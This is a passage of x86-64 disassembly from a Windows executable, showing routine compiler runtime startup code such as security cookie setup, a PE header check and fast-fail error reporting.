   140006b44:	48 0f 45 41 08       	cmovne 0x8(%rcx),%rax
   140006b49:	c3                   	ret
   140006b4a:	cc                   	int3
   140006b4b:	cc                   	int3
   140006b4c:	40 53                	rex push %rbx
   140006b4e:	48 83 ec 20          	sub    $0x20,%rsp
   140006b52:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006b57:	e8 95 1f 00 00       	call   0x140008af1
   140006b5c:	e8 63 05 00 00       	call   0x1400070c4
   140006b61:	8b c8                	mov    %eax,%ecx
   140006b63:	e8 bf 1f 00 00       	call   0x140008b27
   140006b68:	e8 4b 05 00 00       	call   0x1400070b8
   140006b6d:	8b d8                	mov    %eax,%ebx
   140006b6f:	e8 e3 1f 00 00       	call   0x140008b57
   140006b74:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006b79:	89 18                	mov    %ebx,(%rax)
   140006b7b:	e8 c0 02 00 00       	call   0x140006e40
   140006b80:	84 c0                	test   %al,%al
   140006b82:	74 73                	je     0x140006bf7
   140006b84:	e8 c3 07 00 00       	call   0x14000734c
   140006b89:	48 8d 0d f8 07 00 00 	lea    0x7f8(%rip),%rcx        # 0x140007388
   140006b90:	e8 5b 04 00 00       	call   0x140006ff0
   140006b95:	e8 22 05 00 00       	call   0x1400070bc
   140006b9a:	8b c8                	mov    %eax,%ecx
   140006b9c:	e8 5c 1f 00 00       	call   0x140008afd
   140006ba1:	85 c0                	test   %eax,%eax
   140006ba3:	75 52                	jne    0x140006bf7
   140006ba5:	e8 22 05 00 00       	call   0x1400070cc
   140006baa:	e8 59 05 00 00       	call   0x140007108
   140006baf:	85 c0                	test   %eax,%eax
   140006bb1:	74 0c                	je     0x140006bbf
   140006bb3:	48 8d 0d fe 04 00 00 	lea    0x4fe(%rip),%rcx        # 0x1400070b8
   140006bba:	e8 38 1f 00 00       	call   0x140008af7
   140006bbf:	e8 1c 05 00 00       	call   0x1400070e0
   140006bc4:	e8 17 05 00 00       	call   0x1400070e0
   140006bc9:	e8 ea 04 00 00       	call   0x1400070b8
   140006bce:	8b c8                	mov    %eax,%ecx
   140006bd0:	e8 76 1f 00 00       	call   0x140008b4b
   140006bd5:	e8 02 05 00 00       	call   0x1400070dc
   140006bda:	84 c0                	test   %al,%al
   140006bdc:	74 05                	je     0x140006be3
   140006bde:	e8 20 1f 00 00       	call   0x140008b03
   140006be3:	e8 d0 04 00 00       	call   0x1400070b8
   140006be8:	e8 8f 06 00 00       	call   0x14000727c
   140006bed:	85 c0                	test   %eax,%eax
   140006bef:	75 06                	jne    0x140006bf7
   140006bf1:	48 83 c4 20          	add    $0x20,%rsp
   140006bf5:	5b                   	pop    %rbx
   140006bf6:	c3                   	ret
   140006bf7:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006bfc:	e8 2f 05 00 00       	call   0x140007130
   140006c01:	cc                   	int3
   140006c02:	cc                   	int3
   140006c03:	cc                   	int3
   140006c04:	48 83 ec 28          	sub    $0x28,%rsp
   140006c08:	e8 df 04 00 00       	call   0x1400070ec
   140006c0d:	33 c0                	xor    %eax,%eax
   140006c0f:	48 83 c4 28          	add    $0x28,%rsp
   140006c13:	c3                   	ret
   140006c14:	48 83 ec 28          	sub    $0x28,%rsp
   140006c18:	e8 bb 06 00 00       	call   0x1400072d8
   140006c1d:	e8 96 04 00 00       	call   0x1400070b8
   140006c22:	8b c8                	mov    %eax,%ecx
   140006c24:	48 83 c4 28          	add    $0x28,%rsp
   140006c28:	e9 24 1f 00 00       	jmp    0x140008b51
   140006c2d:	cc                   	int3
   140006c2e:	cc                   	int3
   140006c2f:	cc                   	int3
   140006c30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006c35:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006c3a:	57                   	push   %rdi
   140006c3b:	48 83 ec 30          	sub    $0x30,%rsp
   140006c3f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006c44:	e8 bb 01 00 00       	call   0x140006e04
   140006c49:	84 c0                	test   %al,%al
   140006c4b:	0f 84 36 01 00 00    	je     0x140006d87
   140006c51:	40 32 f6             	xor    %sil,%sil
   140006c54:	40 88 74 24 20       	mov    %sil,0x20(%rsp)
   140006c59:	e8 6a 01 00 00       	call   0x140006dc8
   140006c5e:	8a d8                	mov    %al,%bl
   140006c60:	8b 0d 7a 38 01 00    	mov    0x1387a(%rip),%ecx        # 0x14001a4e0
   140006c66:	83 f9 01             	cmp    $0x1,%ecx
   140006c69:	0f 84 23 01 00 00    	je     0x140006d92
   140006c6f:	85 c9                	test   %ecx,%ecx
   140006c71:	75 4a                	jne    0x140006cbd
   140006c73:	c7 05 63 38 01 00 01 	movl   $0x1,0x13863(%rip)        # 0x14001a4e0
   140006c7a:	00 00 00 
   140006c7d:	48 8d 15 64 36 00 00 	lea    0x3664(%rip),%rdx        # 0x14000a2e8
   140006c84:	48 8d 0d 45 36 00 00 	lea    0x3645(%rip),%rcx        # 0x14000a2d0
   140006c8b:	e8 85 1e 00 00       	call   0x140008b15
   140006c90:	85 c0                	test   %eax,%eax
   140006c92:	74 0a                	je     0x140006c9e
   140006c94:	b8 ff 00 00 00       	mov    $0xff,%eax
   140006c99:	e9 d9 00 00 00       	jmp    0x140006d77
   140006c9e:	48 8d 15 23 36 00 00 	lea    0x3623(%rip),%rdx        # 0x14000a2c8
   140006ca5:	48 8d 0d 0c 36 00 00 	lea    0x360c(%rip),%rcx        # 0x14000a2b8
   140006cac:	e8 5e 1e 00 00       	call   0x140008b0f
   140006cb1:	c7 05 25 38 01 00 02 	movl   $0x2,0x13825(%rip)        # 0x14001a4e0
   140006cb8:	00 00 00 
   140006cbb:	eb 08                	jmp    0x140006cc5
   140006cbd:	40 b6 01             	mov    $0x1,%sil
   140006cc0:	40 88 74 24 20       	mov    %sil,0x20(%rsp)
   140006cc5:	8a cb                	mov    %bl,%cl
   140006cc7:	e8 98 02 00 00       	call   0x140006f64
   140006ccc:	e8 43 04 00 00       	call   0x140007114
   140006cd1:	48 8b d8             	mov    %rax,%rbx
   140006cd4:	48 83 38 00          	cmpq   $0x0,(%rax)
   140006cd8:	74 1e                	je     0x140006cf8
   140006cda:	48 8b c8             	mov    %rax,%rcx
   140006cdd:	e8 ea 01 00 00       	call   0x140006ecc
   140006ce2:	84 c0                	test   %al,%al
   140006ce4:	74 12                	je     0x140006cf8
   140006ce6:	45 33 c0             	xor    %r8d,%r8d
   140006ce9:	41 8d 50 02          	lea    0x2(%r8),%edx
   140006ced:	33 c9                	xor    %ecx,%ecx
   140006cef:	48 8b 03             	mov    (%rbx),%rax
   140006cf2:	ff 15 98 35 00 00    	call   *0x3598(%rip)        # 0x14000a290
   140006cf8:	e8 1f 04 00 00       	call   0x14000711c
   140006cfd:	48 8b d8             	mov    %rax,%rbx
   140006d00:	48 83 38 00          	cmpq   $0x0,(%rax)
   140006d04:	74 14                	je     0x140006d1a
   140006d06:	48 8b c8             	mov    %rax,%rcx
   140006d09:	e8 be 01 00 00       	call   0x140006ecc
   140006d0e:	84 c0                	test   %al,%al
   140006d10:	74 08                	je     0x140006d1a
   140006d12:	48 8b 0b             	mov    (%rbx),%rcx
   140006d15:	e8 2b 1e 00 00       	call   0x140008b45
   140006d1a:	e8 ea 1d 00 00       	call   0x140008b09
   140006d1f:	48 8b f8             	mov    %rax,%rdi
   140006d22:	e8 0c 1e 00 00       	call   0x140008b33
   140006d27:	48 8b 18             	mov    (%rax),%rbx
   140006d2a:	e8 fe 1d 00 00       	call   0x140008b2d
   140006d2f:	4c 8b c7             	mov    %rdi,%r8
   140006d32:	48 8b d3             	mov    %rbx,%rdx
   140006d35:	8b 08                	mov    (%rax),%ecx
   140006d37:	e8 d4 22 00 00       	call   0x140009010
   140006d3c:	8b d8                	mov    %eax,%ebx
   140006d3e:	e8 41 05 00 00       	call   0x140007284
   140006d43:	84 c0                	test   %al,%al
   140006d45:	74 55                	je     0x140006d9c
   140006d47:	40 84 f6             	test   %sil,%sil
   140006d4a:	75 05                	jne    0x140006d51
   140006d4c:	e8 e8 1d 00 00       	call   0x140008b39
   140006d51:	33 d2                	xor    %edx,%edx
   140006d53:	b1 01                	mov    $0x1,%cl
   140006d55:	e8 2e 02 00 00       	call   0x140006f88
   140006d5a:	8b c3                	mov    %ebx,%eax
   140006d5c:	eb 19                	jmp    0x140006d77
   140006d5e:	8b d8                	mov    %eax,%ebx
   140006d60:	e8 1f 05 00 00       	call   0x140007284
   140006d65:	84 c0                	test   %al,%al
   140006d67:	74 3b                	je     0x140006da4
   140006d69:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140006d6e:	75 05                	jne    0x140006d75
   140006d70:	e8 ca 1d 00 00       	call   0x140008b3f
   140006d75:	8b c3                	mov    %ebx,%eax
   140006d77:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006d7c:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140006d81:	48 83 c4 30          	add    $0x30,%rsp
   140006d85:	5f                   	pop    %rdi
   140006d86:	c3                   	ret
   140006d87:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006d8c:	e8 9f 03 00 00       	call   0x140007130
   140006d91:	90                   	nop
   140006d92:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006d97:	e8 94 03 00 00       	call   0x140007130
   140006d9c:	8b cb                	mov    %ebx,%ecx
   140006d9e:	e8 78 1d 00 00       	call   0x140008b1b
   140006da3:	90                   	nop
   140006da4:	8b cb                	mov    %ebx,%ecx
   140006da6:	e8 76 1d 00 00       	call   0x140008b21
   140006dab:	90                   	nop
   140006dac:	48 83 ec 28          	sub    $0x28,%rsp
   140006db0:	e8 53 02 00 00       	call   0x140007008
   140006db5:	48 83 c4 28          	add    $0x28,%rsp
   140006db9:	e9 72 fe ff ff       	jmp    0x140006c30
   140006dbe:	cc                   	int3
   140006dbf:	cc                   	int3
   140006dc0:	e9 ff 05 00 00       	jmp    0x1400073c4
   140006dc5:	cc                   	int3
   140006dc6:	cc                   	int3
   140006dc7:	cc                   	int3
   140006dc8:	48 83 ec 28          	sub    $0x28,%rsp
   140006dcc:	e8 93 08 00 00       	call   0x140007664
   140006dd1:	85 c0                	test   %eax,%eax
   140006dd3:	74 21                	je     0x140006df6
   140006dd5:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140006ddc:	00 00 
   140006dde:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140006de2:	eb 05                	jmp    0x140006de9
   140006de4:	48 3b c8             	cmp    %rax,%rcx
   140006de7:	74 14                	je     0x140006dfd
   140006de9:	33 c0                	xor    %eax,%eax
   140006deb:	f0 48 0f b1 0d f4 36 	lock cmpxchg %rcx,0x136f4(%rip)        # 0x14001a4e8
   140006df2:	01 00 
   140006df4:	75 ee                	jne    0x140006de4
   140006df6:	32 c0                	xor    %al,%al
   140006df8:	48 83 c4 28          	add    $0x28,%rsp
   140006dfc:	c3                   	ret
   140006dfd:	b0 01                	mov    $0x1,%al
   140006dff:	eb f7                	jmp    0x140006df8
   140006e01:	cc                   	int3
   140006e02:	cc                   	int3
   140006e03:	cc                   	int3
   140006e04:	48 83 ec 28          	sub    $0x28,%rsp
   140006e08:	85 c9                	test   %ecx,%ecx
   140006e0a:	75 07                	jne    0x140006e13
   140006e0c:	c6 05 dd 36 01 00 01 	movb   $0x1,0x136dd(%rip)        # 0x14001a4f0
   140006e13:	e8 b4 05 00 00       	call   0x1400073cc
   140006e18:	e8 bf 02 00 00       	call   0x1400070dc
   140006e1d:	84 c0                	test   %al,%al
   140006e1f:	75 04                	jne    0x140006e25
   140006e21:	32 c0                	xor    %al,%al
   140006e23:	eb 14                	jmp    0x140006e39
   140006e25:	e8 b2 02 00 00       	call   0x1400070dc
   140006e2a:	84 c0                	test   %al,%al
   140006e2c:	75 09                	jne    0x140006e37
   140006e2e:	33 c9                	xor    %ecx,%ecx
   140006e30:	e8 a7 02 00 00       	call   0x1400070dc
   140006e35:	eb ea                	jmp    0x140006e21
   140006e37:	b0 01                	mov    $0x1,%al
   140006e39:	48 83 c4 28          	add    $0x28,%rsp
   140006e3d:	c3                   	ret
   140006e3e:	cc                   	int3
   140006e3f:	cc                   	int3
   140006e40:	40 53                	rex push %rbx
   140006e42:	48 83 ec 20          	sub    $0x20,%rsp
   140006e46:	80 3d a4 36 01 00 00 	cmpb   $0x0,0x136a4(%rip)        # 0x14001a4f1
   140006e4d:	8b d9                	mov    %ecx,%ebx
   140006e4f:	75 67                	jne    0x140006eb8
   140006e51:	83 f9 01             	cmp    $0x1,%ecx
   140006e54:	77 6a                	ja     0x140006ec0
   140006e56:	e8 09 08 00 00       	call   0x140007664
   140006e5b:	85 c0                	test   %eax,%eax
   140006e5d:	74 28                	je     0x140006e87
   140006e5f:	85 db                	test   %ebx,%ebx
   140006e61:	75 24                	jne    0x140006e87
   140006e63:	48 8d 0d 8e 36 01 00 	lea    0x1368e(%rip),%rcx        # 0x14001a4f8
   140006e6a:	e8 ee 1c 00 00       	call   0x140008b5d
   140006e6f:	85 c0                	test   %eax,%eax
   140006e71:	75 10                	jne    0x140006e83
   140006e73:	48 8d 0d 96 36 01 00 	lea    0x13696(%rip),%rcx        # 0x14001a510
   140006e7a:	e8 de 1c 00 00       	call   0x140008b5d
   140006e7f:	85 c0                	test   %eax,%eax
   140006e81:	74 2e                	je     0x140006eb1
   140006e83:	32 c0                	xor    %al,%al
   140006e85:	eb 33                	jmp    0x140006eba
   140006e87:	66 0f 6f 05 21 3a 00 	movdqa 0x3a21(%rip),%xmm0        # 0x14000a8b0
   140006e8e:	00 
   140006e8f:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140006e93:	f3 0f 7f 05 5d 36 01 	movdqu %xmm0,0x1365d(%rip)        # 0x14001a4f8
   140006e9a:	00 
   140006e9b:	48 89 05 66 36 01 00 	mov    %rax,0x13666(%rip)        # 0x14001a508
   140006ea2:	f3 0f 7f 05 66 36 01 	movdqu %xmm0,0x13666(%rip)        # 0x14001a510
   140006ea9:	00 
   140006eaa:	48 89 05 6f 36 01 00 	mov    %rax,0x1366f(%rip)        # 0x14001a520
   140006eb1:	c6 05 39 36 01 00 01 	movb   $0x1,0x13639(%rip)        # 0x14001a4f1
   140006eb8:	b0 01                	mov    $0x1,%al
   140006eba:	48 83 c4 20          	add    $0x20,%rsp
   140006ebe:	5b                   	pop    %rbx
   140006ebf:	c3                   	ret
   140006ec0:	b9 05 00 00 00       	mov    $0x5,%ecx
   140006ec5:	e8 66 02 00 00       	call   0x140007130
   140006eca:	cc                   	int3
   140006ecb:	cc                   	int3
   140006ecc:	48 83 ec 18          	sub    $0x18,%rsp
   140006ed0:	4c 8b c1             	mov    %rcx,%r8
   140006ed3:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140006ed8:	66 39 05 21 91 ff ff 	cmp    %ax,-0x6edf(%rip)        # 0x140000000
   140006edf:	75 78                	jne    0x140006f59
   140006ee1:	48 63 0d 54 91 ff ff 	movslq -0x6eac(%rip),%rcx        # 0x14000003c
   140006ee8:	48 8d 15 11 91 ff ff 	lea    -0x6eef(%rip),%rdx        # 0x140000000
   140006eef:	48 03 ca             	add    %rdx,%rcx
   140006ef2:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140006ef8:	75 5f                	jne    0x140006f59
   140006efa:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140006eff:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140006f03:	75 54                	jne    0x140006f59
   140006f05:	4c 2b c2             	sub    %rdx,%r8
   140006f08:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   140006f0c:	48 83 c2 18          	add    $0x18,%rdx
   140006f10:	48 03 d1             	add    %rcx,%rdx
   140006f13:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140006f17:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140006f1b:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   140006f1f:	48 89 14 24          	mov    %rdx,(%rsp)
   140006f23:	49 3b d1             	cmp    %r9,%rdx
   140006f26:	74 18                	je     0x140006f40
   140006f28:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   140006f2b:	4c 3b c1             	cmp    %rcx,%r8
   140006f2e:	72 0a                	jb     0x140006f3a
   140006f30:	8b 42 08             	mov    0x8(%rdx),%eax
   140006f33:	03 c1                	add    %ecx,%eax
   140006f35:	4c 3b c0             	cmp    %rax,%r8
   140006f38:	72 08                	jb     0x140006f42
   140006f3a:	48 83 c2 28          	add    $0x28,%rdx
   140006f3e:	eb df                	jmp    0x140006f1f
   140006f40:	33 d2                	xor    %edx,%edx
   140006f42:	48 85 d2             	test   %rdx,%rdx
   140006f45:	75 04                	jne    0x140006f4b
   140006f47:	32 c0                	xor    %al,%al
   140006f49:	eb 14                	jmp    0x140006f5f
   140006f4b:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   140006f4f:	7d 04                	jge    0x140006f55
   140006f51:	32 c0                	xor    %al,%al
   140006f53:	eb 0a                	jmp    0x140006f5f
   140006f55:	b0 01                	mov    $0x1,%al
   140006f57:	eb 06                	jmp    0x140006f5f
   140006f59:	32 c0                	xor    %al,%al
   140006f5b:	eb 02                	jmp    0x140006f5f
   140006f5d:	32 c0                	xor    %al,%al
   140006f5f:	48 83 c4 18          	add    $0x18,%rsp
   140006f63:	c3                   	ret
   140006f64:	40 53                	rex push %rbx
   140006f66:	48 83 ec 20          	sub    $0x20,%rsp
   140006f6a:	8a d9                	mov    %cl,%bl
   140006f6c:	e8 f3 06 00 00       	call   0x140007664
   140006f71:	33 d2                	xor    %edx,%edx
   140006f73:	85 c0                	test   %eax,%eax
   140006f75:	74 0b                	je     0x140006f82
   140006f77:	84 db                	test   %bl,%bl
   140006f79:	75 07                	jne    0x140006f82
   140006f7b:	48 87 15 66 35 01 00 	xchg   %rdx,0x13566(%rip)        # 0x14001a4e8
   140006f82:	48 83 c4 20          	add    $0x20,%rsp
   140006f86:	5b                   	pop    %rbx
   140006f87:	c3                   	ret
   140006f88:	40 53                	rex push %rbx
   140006f8a:	48 83 ec 20          	sub    $0x20,%rsp
   140006f8e:	80 3d 5b 35 01 00 00 	cmpb   $0x0,0x1355b(%rip)        # 0x14001a4f0
   140006f95:	8a d9                	mov    %cl,%bl
   140006f97:	74 04                	je     0x140006f9d
   140006f99:	84 d2                	test   %dl,%dl
   140006f9b:	75 0c                	jne    0x140006fa9
   140006f9d:	e8 3a 01 00 00       	call   0x1400070dc
   140006fa2:	8a cb                	mov    %bl,%cl
   140006fa4:	e8 33 01 00 00       	call   0x1400070dc
   140006fa9:	b0 01                	mov    $0x1,%al
   140006fab:	48 83 c4 20          	add    $0x20,%rsp
   140006faf:	5b                   	pop    %rbx
   140006fb0:	c3                   	ret
   140006fb1:	cc                   	int3
   140006fb2:	cc                   	int3
   140006fb3:	cc                   	int3
   140006fb4:	40 53                	rex push %rbx
   140006fb6:	48 83 ec 20          	sub    $0x20,%rsp
   140006fba:	48 83 3d 36 35 01 00 	cmpq   $0xffffffffffffffff,0x13536(%rip)        # 0x14001a4f8
   140006fc1:	ff 
   140006fc2:	48 8b d9             	mov    %rcx,%rbx
   140006fc5:	75 07                	jne    0x140006fce
   140006fc7:	e8 9d 1b 00 00       	call   0x140008b69
   140006fcc:	eb 0f                	jmp    0x140006fdd
   140006fce:	48 8b d3             	mov    %rbx,%rdx
   140006fd1:	48 8d 0d 20 35 01 00 	lea    0x13520(%rip),%rcx        # 0x14001a4f8
   140006fd8:	e8 86 1b 00 00       	call   0x140008b63
   140006fdd:	33 d2                	xor    %edx,%edx
   140006fdf:	85 c0                	test   %eax,%eax
   140006fe1:	48 0f 44 d3          	cmove  %rbx,%rdx
   140006fe5:	48 8b c2             	mov    %rdx,%rax
   140006fe8:	48 83 c4 20          	add    $0x20,%rsp
   140006fec:	5b                   	pop    %rbx
   140006fed:	c3                   	ret
   140006fee:	cc                   	int3
   140006fef:	cc                   	int3
   140006ff0:	48 83 ec 28          	sub    $0x28,%rsp
   140006ff4:	e8 bb ff ff ff       	call   0x140006fb4
   140006ff9:	48 f7 d8             	neg    %rax
   140006ffc:	1b c0                	sbb    %eax,%eax
   140006ffe:	f7 d8                	neg    %eax
   140007000:	ff c8                	dec    %eax
   140007002:	48 83 c4 28          	add    $0x28,%rsp
   140007006:	c3                   	ret
   140007007:	cc                   	int3
   140007008:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000700d:	55                   	push   %rbp
   14000700e:	48 8b ec             	mov    %rsp,%rbp
   140007011:	48 83 ec 30          	sub    $0x30,%rsp
   140007015:	48 8b 05 24 31 01 00 	mov    0x13124(%rip),%rax        # 0x14001a140
   14000701c:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140007023:	2b 00 00 
   140007026:	48 3b c3             	cmp    %rbx,%rax
   140007029:	75 77                	jne    0x1400070a2
   14000702b:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   14000702f:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   140007036:	00 
   140007037:	ff 15 f3 2f 00 00    	call   *0x2ff3(%rip)        # 0x14000a030
   14000703d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140007041:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140007045:	ff 15 cd 2f 00 00    	call   *0x2fcd(%rip)        # 0x14000a018
   14000704b:	8b c0                	mov    %eax,%eax
   14000704d:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140007051:	ff 15 d1 2f 00 00    	call   *0x2fd1(%rip)        # 0x14000a028
   140007057:	8b c0                	mov    %eax,%eax
   140007059:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000705d:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140007061:	ff 15 b9 2f 00 00    	call   *0x2fb9(%rip)        # 0x14000a020
   140007067:	8b 45 18             	mov    0x18(%rbp),%eax
   14000706a:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000706e:	48 c1 e0 20          	shl    $0x20,%rax
   140007072:	48 33 45 18          	xor    0x18(%rbp),%rax
   140007076:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   14000707a:	48 33 c1             	xor    %rcx,%rax
   14000707d:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140007084:	ff 00 00 
   140007087:	48 23 c1             	and    %rcx,%rax
   14000708a:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140007091:	2b 00 00 
   140007094:	48 3b c3             	cmp    %rbx,%rax
   140007097:	48 0f 44 c1          	cmove  %rcx,%rax
   14000709b:	48 89 05 9e 30 01 00 	mov    %rax,0x1309e(%rip)        # 0x14001a140
   1400070a2:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400070a7:	48 f7 d0             	not    %rax
   1400070aa:	48 89 05 cf 30 01 00 	mov    %rax,0x130cf(%rip)        # 0x14001a180
   1400070b1:	48 83 c4 30          	add    $0x30,%rsp
   1400070b5:	5d                   	pop    %rbp
   1400070b6:	c3                   	ret
   1400070b7:	cc                   	int3
   1400070b8:	33 c0                	xor    %eax,%eax
   1400070ba:	c3                   	ret
   1400070bb:	cc                   	int3
   1400070bc:	b8 01 00 00 00       	mov    $0x1,%eax
   1400070c1:	c3                   	ret
   1400070c2:	cc                   	int3
   1400070c3:	cc                   	int3
   1400070c4:	b8 00 40 00 00       	mov    $0x4000,%eax
   1400070c9:	c3                   	ret
   1400070ca:	cc                   	int3
   1400070cb:	cc                   	int3
   1400070cc:	48 8d 0d 5d 34 01 00 	lea    0x1345d(%rip),%rcx        # 0x14001a530
   1400070d3:	48 ff 25 5e 2f 00 00 	rex.W jmp *0x2f5e(%rip)        # 0x14000a038
   1400070da:	cc                   	int3
   1400070db:	cc                   	int3
   1400070dc:	b0 01                	mov    $0x1,%al
   1400070de:	c3                   	ret
   1400070df:	cc                   	int3
   1400070e0:	c2 00 00             	ret    $0x0
   1400070e3:	cc                   	int3
   1400070e4:	48 8d 05 55 34 01 00 	lea    0x13455(%rip),%rax        # 0x14001a540
   1400070eb:	c3                   	ret
   1400070ec:	48 83 ec 28          	sub    $0x28,%rsp
   1400070f0:	e8 bf f8 ff ff       	call   0x1400069b4
   1400070f5:	48 83 08 24          	orq    $0x24,(%rax)
   1400070f9:	e8 e6 ff ff ff       	call   0x1400070e4
   1400070fe:	48 83 08 02          	orq    $0x2,(%rax)
   140007102:	48 83 c4 28          	add    $0x28,%rsp
   140007106:	c3                   	ret
   140007107:	cc                   	int3
   140007108:	33 c0                	xor    %eax,%eax
   14000710a:	39 05 fc 2f 01 00    	cmp    %eax,0x12ffc(%rip)        # 0x14001a10c
   140007110:	0f 94 c0             	sete   %al
   140007113:	c3                   	ret
   140007114:	48 8d 05 ed 35 01 00 	lea    0x135ed(%rip),%rax        # 0x14001a708
   14000711b:	c3                   	ret
   14000711c:	48 8d 05 dd 35 01 00 	lea    0x135dd(%rip),%rax        # 0x14001a700
   140007123:	c3                   	ret
   140007124:	c7 05 1a 34 01 00 00 	movl   $0x0,0x1341a(%rip)        # 0x14001a548
   14000712b:	00 00 00 
   14000712e:	c3                   	ret
   14000712f:	cc                   	int3
   140007130:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007135:	55                   	push   %rbp
   140007136:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   14000713d:	ff 
   14000713e:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   140007145:	8b d9                	mov    %ecx,%ebx
   140007147:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000714c:	ff 15 1e 2f 00 00    	call   *0x2f1e(%rip)        # 0x14000a070
   140007152:	85 c0                	test   %eax,%eax
   140007154:	74 04                	je     0x14000715a
   140007156:	8b cb                	mov    %ebx,%ecx
   140007158:	cd 29                	int    $0x29
   14000715a:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000715f:	e8 c0 ff ff ff       	call   0x140007124
   140007164:	33 d2                	xor    %edx,%edx
   140007166:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000716a:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140007170:	e8 3a 19 00 00       	call   0x140008aaf
   140007175:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140007179:	ff 15 c1 2e 00 00    	call   *0x2ec1(%rip)        # 0x14000a040
   14000717f:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140007186:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   14000718d:	48 8b cb             	mov    %rbx,%rcx
   140007190:	45 33 c0             	xor    %r8d,%r8d
   140007193:	ff 15 af 2e 00 00    	call   *0x2eaf(%rip)        # 0x14000a048
   140007199:	48 85 c0             	test   %rax,%rax
   14000719c:	74 3f                	je     0x1400071dd
   14000719e:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   1400071a5:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   1400071ac:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   1400071b3:	00 00 
   1400071b5:	4c 8b c8             	mov    %rax,%r9
   1400071b8:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400071bd:	4c 8b c3             	mov    %rbx,%r8
   1400071c0:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   1400071c7:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400071cc:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400071d0:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400071d5:	33 c9                	xor    %ecx,%ecx
   1400071d7:	ff 15 73 2e 00 00    	call   *0x2e73(%rip)        # 0x14000a050
   1400071dd:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400071e4:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400071e9:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   1400071f0:	33 d2                	xor    %edx,%edx
   1400071f2:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   1400071f9:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1400071ff:	48 83 c0 08          	add    $0x8,%rax
   140007203:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   14000720a:	e8 a0 18 00 00       	call   0x140008aaf
   14000720f:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140007216:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000721b:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   140007222:	40 
   140007223:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   14000722a:	00 
   14000722b:	ff 15 27 2e 00 00    	call   *0x2e27(%rip)        # 0x14000a058
   140007231:	8b d8                	mov    %eax,%ebx
   140007233:	33 c9                	xor    %ecx,%ecx
   140007235:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000723a:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000723f:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140007243:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140007248:	ff 15 1a 2e 00 00    	call   *0x2e1a(%rip)        # 0x14000a068
   14000724e:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007253:	ff 15 07 2e 00 00    	call   *0x2e07(%rip)        # 0x14000a060
   140007259:	85 c0                	test   %eax,%eax
   14000725b:	75 0d                	jne    0x14000726a
   14000725d:	83 fb 01             	cmp    $0x1,%ebx
   140007260:	74 08                	je     0x14000726a
